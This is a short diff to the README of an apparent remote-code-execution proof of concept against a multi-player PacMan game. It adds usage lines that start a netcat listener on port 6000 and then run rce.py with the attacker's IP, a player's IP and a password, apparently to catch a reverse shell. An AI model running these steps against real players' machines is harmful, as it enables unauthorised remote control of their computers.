@@ -5,6 +5,8 @@ RCE exploit PoC for [multi-player PacMan]().
 
 ## Usage
 
-```
-rce.py [your ip] [player ip] [password]'
+```sh
+$ nc -lv 6000
+
+$ rce.py [your ip] [player ip] [password]'
 ```
